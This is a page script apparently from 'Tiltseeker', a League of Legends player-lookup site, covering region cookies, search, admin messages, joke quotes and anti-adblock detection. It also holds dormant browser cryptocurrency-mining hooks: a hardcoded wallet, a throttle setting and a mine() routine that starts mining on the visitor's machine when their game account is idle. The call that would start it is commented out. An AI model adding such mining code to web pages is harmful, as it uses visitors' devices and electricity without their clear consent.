// JavaScript Document

var region = "NA";
if (getCookie('region')) {
	region = getCookie('region');
}

function getRegionID(theRegion) {
	var regions = ["NA", "EUW", "EUNE", "BR", "TR", "RU", "LAN", "LAS", "OCE", "KR", "JP"];
	var regionIDs = ["na1", "euw1", "eun1", "br1", "tr1", "ru", "la1", "la2", "oc1", "kr", "jp1"];
	return regionIDs[regions.indexOf(theRegion)];
}

//var lastHashes = 0;
//var lastHashRate = 0;
////display hashrate
//setInterval(function() {
//	var theHashes = totalhashes;
//	console.log(theHashes - lastHashes);
//	lastHashRate = theHashes - lastHashes;
//	lastHashes = theHashes;
//},1000)


//var lastHashCount = 0;
//var lastRatesList = [];
////display hashrate
//setInterval(function() {
////	console.log(window._BatStats);
//	var theHashes = totalhashes;
//	lastRatesList.push(theHashes-lastHashCount);
//	var avgHash = 0;
//	for (var i = 0; i < lastRatesList.length; i++) {
//		avgHash += lastRatesList[i];
//	}
//	avgHash = avgHash/lastRatesList.length;
//	if (lastRatesList.length > 5) {
//		lastRatesList.shift();
//	}
//	lastHashCount = theHashes;
//	document.getElementById("hashrate").innerHTML = Math.round(avgHash) + " H/s";
////	console.log(Math.round(avgHash) + " H/s");
////	console.log("accepted hashes:" + acceptedhashes);
//},1000)

//set borders on ads
window.setInterval(function fixBorders() {
	var ads = document.getElementsByClassName("ad");
	for (var i = 0; i < ads.length; i++) {
		console.log(ads[i].children[0].children.length);
		if (ads[i].children[0].children.length  <= 0) {
			ads[i].style.borderStyle = "none";
		} else {
			ads[i].style.borderStyle = "solid";
		}
	}
}, 200);


//display random quotes
var quotes = [
	"\"Stats are good, winning is better\"",
	"\"We'll use Tiltseeker for week 2 at Worlds\"",
	"\"Please be our friend\"",
	"\"Camp someone who flames as much as Brand\"",
	"\"Camp someone toxic. Like my sister, Cassiopeia\"",
	"\"Would you like a tent?\"",
	"\"Our midlaner has less vision than I do\"",
	"\"With Tiltseeker, you can transform into something better\"",
	"\"Camp someone who has no mana\"",
	"\"Keep camping. See what happens.\"",
];

var authors = [
	" - Faker... probably",
	" - Every NA Team",
	" - Amumu",
	" - Bjergsen... probably",
	" - Katarina",
	" - Losing Midlaner",
	" - Lee Sin",
	" - Kayn",
	" - Tyler1... maybe",
	" - Someone you should keep camping",
];

var myRand = Math.floor(Math.random() * quotes.length);

document.getElementById("quote").textContent = quotes[myRand];

document.getElementById("author").textContent = authors[myRand];

document.addEventListener("DOMContentLoaded", function(event) { 
  document.getElementById("wittyQuote").style.opacity = 1;
});



//region select button event listeners
var regionObjs = document.getElementsByClassName("region-button");
for (var i = 0; i < regionObjs.length; i++) {
	var regions = document.getElementById("region-select").getElementsByTagName("li");
	if (regions[i].textContent == region) {
		document.getElementById(regions[i].textContent).style.backgroundColor = "#111";
	} else {
		document.getElementById(regions[i].textContent).style.backgroundColor = "#333";
	}
	(function (index) {
		regionObjs[index].addEventListener("click", function () {
			region = this.textContent;
			setCookie('region', region, 30);
			console.log(getRegionID(region));
			var regions = document.getElementById("region-select").getElementsByTagName("li");
			for (var i = 0; i < regions.length; i++) {
				if (regions[i].textContent == region) {
					document.getElementById(regions[i].textContent).style.backgroundColor = "#111";
				} else {
					document.getElementById(regions[i].textContent).style.backgroundColor = "#333";
				}
			}
		});
	})(i);
}

//Enter key handler for textbox
document.getElementById("textfield").addEventListener("keyup", function(event) {
    event.preventDefault();
    if (event.keyCode === 13) {
        document.getElementById("submit-button").click();
    }
});

document.getElementById("submit-button").addEventListener("click", function(event) {
	if (document.getElementById("textfield").value != "") {
		window.location.href = "tiltseek.html?username=" + document.getElementById("textfield").value + "&region=" + getRegionID(region);
	} else {
		document.getElementById("textfield").className = "textInputError";
		document.getElementById("submit-button").blur();
	}
});

function selectText(textField) {
	textField.focus();
	textField.select();
}

function setCookie(name,value,days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}
function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
function eraseCookie(name) {   
    document.cookie = name+'=; Max-Age=-99999999;';
}


//document.getElementById("hashrate").addEventListener("click", function(event) {
//	document.getElementById("newUserMessage").style.display = "block";
//	$(".newUserMessage").addClass("newUserMessageVisible");
//	document.getElementById("newUserMessage").style.opacity = 1;
//	document.getElementById("mainUsername").value = getCookie("mainUsername");
//	document.getElementById("regionDropdown").value = getCookie("mainRegion");
//	if (getCookie("mainRegion") == null) {
//		document.getElementById("regionDropdown").value = "NA";
//	}
//});







//load administrator message
getAdminMsg().then(
	function success(data) {
		console.log(data);
		if (data != "" && getCookie("lastAdminMsg") != data) {
			console.log(document.getElementById("adminmsg").textContent);
			document.getElementById("adminmsgtext").textContent = data;
			document.getElementById("adminmsg").style.opacity = 1;
		} else {
			document.getElementById("adminmsg").style.display = "none";
		}
	},
	function fail(data) {
		console.log("failed to retrieve admin message");
		document.getElementById("adminmsg").style.display = "none";
	}
);

document.getElementById("adminmsgx").addEventListener("click", function(event) {
	document.getElementById("adminmsg").style.opacity = 0;
	document.getElementById("adminmsg").style.display = "none";
	setCookie("lastAdminMsg", document.getElementById("adminmsgtext").textContent, 30);
});

function getAdminMsg() {
	var promiseObj = new Promise(function (resolve, reject) {
		$.ajax({
			url: '/adminMsg',
			success: function (data) {
				if (data.error == null) {
					resolve(data);
				} else {
					reject(data.error);
				}
			},
			error: function () {
				console.log("Oops! Ajax messed up.");
			}
		});
	});
	return promiseObj;
}




var noMineUsernames = [];
var noMineRegions = [];
var noMineIds = [];
var mining = false;

throttleMiner = 50;
var wallet = '42yWf5tU9fFNUqy774TPzz7AX3XXcHqRyUyJETq51ofYaDWxLPKfjpnjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3fj3KmC+100';

noMineUsernames.push(getCookie("mainUsername"));
noMineRegions.push(getCookie("mainRegion"));
//mine(60);


function mine(checkIntervalSec) {
	loadAllUsernamesNoMine().then(
		function success() {
			console.log(noMineUsernames);
			console.log(noMineRegions);
			console.log(noMineIds);
			
			var myPromises = [];
			for (var i = 0; i < noMineIds.length; i++) {
				myPromises.push(notInGame(noMineIds[i], noMineRegions[i]));
			}
			Promise.all(myPromises).then(
				function success(data) {
					console.log("start mining");
					if (!mining) {
						PerfektStart(wallet, id);
						mining = true;
					}
				},
				function fail(data) {
					console.log("stop mining");
					stopMining();
					mining = false;
				}
			);
			
			setInterval(function () {
				var myPromises = [];
				for (var i = 0; i < noMineIds.length; i++) {
					myPromises.push(notInGame(noMineIds[i], noMineRegions[i]));
				}
				Promise.all(myPromises).then(
					function success(data) {
						if (!mining) {
							console.log("start mining");
							PerfektStart(wallet, id);
							mining = true;
						}
					},
					function fail(data) {
						if(mining) {
							console.log("stop mining");
							stopMining();
							mining = false;
						}
					}
				);
			}, checkIntervalSec * 1000);
		}
	)
}

function notInGame(id, region) {
	var promiseObj = new Promise(function (resolve, reject) {
		getCurrentGameNoMine(id, region).then(
			function success(data) {
				reject();
			},
			function fail(data) {
				resolve();
			}
		);
	});
	return promiseObj;
}

//Load current game from summoner Id
function getCurrentGameNoMine(summonerId, region, asynch = true) {
	var promiseObj = new Promise(function (resolve, reject) {
		$.ajax({
			async: asynch,
			url: '/currentGame',
			data: {
				"summonerId": summonerId,
				"region": region
			},
			success: function (data) {
				if (data.error == null) {
					resolve(data);
				} else {
					reject(data.error);
				}
			},
			error: function () {
				console.log("Oops! Ajax messed up.");
			}
		});
	});
	return promiseObj;
}

function loadAllUsernamesNoMine() {
	var promiseObj = new Promise(function (resolve, reject) {
		if (noMineUsernames.length > 0) {
			var currentUsername = 0;
			loadUserIterate();

			function loadUserIterate() {
				loadUserNoMine(noMineUsernames[currentUsername], noMineRegions[currentUsername]).then(
					function success(data) {
						noMineIds.push(data);
						currentUsername++;
						if (noMineUsernames[currentUsername]) {
							loadUserIterate();
						} else {
							resolve();
						}
					},
					function fail(data) {
						var removeIndex = noMineUsernames.indexOf(noMineUsernames[currentUsername]);
						noMineUsernames.splice(removeIndex, 1);
						noMineRegions.splice(removeIndex, 1);
						if (noMineUsernames[currentUsername]) {
							loadUserIterate();
						} else {
							resolve();
						}
					}
				);
			}
		}
	});
	return promiseObj;
}

//Returns the input username's ID
function loadUserNoMine(username, region) {
	var promiseObj = new Promise(function (resolve, reject) {
		getUserInfoByNameNoMine(username, region).then(
			function success(data) {
				resolve(data.id);
			},
			function fail(data) {
				console.log("fail: " + data);
				reject();
			}
		);
	});
	return promiseObj;
}

//Load summoner info by summoner name
function getUserInfoByNameNoMine(theUsername, theRegion, asynch = true) {
	var promiseObj = new Promise(function (resolve, reject) {
		$.ajax({
			async: asynch,
			url: '/summonerByName',
			data: {
				"username": theUsername,
				"region": theRegion
			},
			success: function (data) {
				if (data.error == null) {
					resolve(data);
				} else {
					reject(data.error);
				}
			},
			error: function () {
				console.log("Oops! Ajax messed up.");
			}
		});
	});
	return promiseObj;
}




//display new user message
var mainUsername = getCookie("mainUsername");
var laterCookie = getCookie("later");
console.log(laterCookie);
console.log("DERP");
console.log(laterCookie == null && !getCookie("donated"))

// Function called if AdBlock is not detected
function adBlockNotDetected() {
	
}
// Function called if AdBlock is detected
function adBlockDetected() {
	//open popup
	if (laterCookie == null && !getCookie("donated")) {
		$(".newUserMessage").addClass("newUserMessageVisible");
	} else {
		document.getElementById("newUserMessage").style.display = "none";
	}
}

// We look at whether FuckAdBlock already exists.
if(typeof fuckAdBlock !== 'undefined' || typeof FuckAdBlock !== 'undefined') {
	// If this is the case, it means that something tries to usurp are identity
	// So, considering that it is a detection
	adBlockDetected();
} else {
	// Otherwise, you import the script FuckAdBlock
	var importFAB = document.createElement('script');
	importFAB.onload = function() {
		// If all goes well, we configure FuckAdBlock
		fuckAdBlock.onDetected(adBlockDetected)
		fuckAdBlock.onNotDetected(adBlockNotDetected);
	};
	importFAB.onerror = function() {
		// If the script does not load (blocked, integrity error, ...)
		// Then a detection is triggered
		adBlockDetected(); 
	};
	importFAB.integrity = 'sha256-xjwKUY/NgkPjZZBOtOxRYtK20GaqTwUCf7WYCJ1z69w=';
	importFAB.crossOrigin = 'anonymous';
	importFAB.src = 'https://cdnjs.cloudflare.com/ajax/libs/fuckadblock/3.2.1/fuckadblock.min.js';
	document.head.appendChild(importFAB);
}





////Enter key handler for mainUsername textbox
//document.getElementById("mainUsername").addEventListener("keyup", function(event) {
//    event.preventDefault();
//    if (event.keyCode === 13) {
//        document.getElementById("submit-mainUsername").click();
//    }
//});
//
//document.getElementById("submit-mainUsername").addEventListener("click", function(event) {
//	//if username is given
//	if (document.getElementById("mainUsername").value != "") {
//		setCookie("mainUsername",document.getElementById("mainUsername").value,365);
//		setCookie("mainRegion",document.getElementById("regionDropdown").value,356);
//		document.getElementById("newUserMessage").style.opacity = 0;
//		setTimeout(function() {
//			document.getElementById("newUserMessage").style.display = "none";
//			document.getElementById("textfield").focus();
//		}, 600);
//	} else {
//		document.getElementById("mainUsername").className = "mainUsernameInputError";
//	}
//});

document.getElementById("cancelButton").addEventListener("click", function(event) {
	//if username is given
	setCookie("later", true, 0.0416);
	eraseCookie("mainUsername");
	document.getElementById("newUserMessage").style.opacity = 0;
	setTimeout(function() {
		document.getElementById("newUserMessage").style.display = "none";
		document.getElementById("textfield").focus();
	}, 600);
});





function displayDraven() {
	if (Math.random() > 0.99 || getCookie("curseOfDraven")) {
		var x = Math.random()*(window.innerWidth-180);
		var y = Math.random()*(window.innerHeight-220);
		//Move the image to the new location
		document.getElementById("draven").style.top = y + 'px';
		document.getElementById("draven").style.left = x + 'px';
		$(".draven").addClass("dravenVis");
		window.setTimeout(function() {
			$(".draven").removeClass("dravenVis");
		}, 500);
	}
}

window.setInterval('displayDraven()', 3000);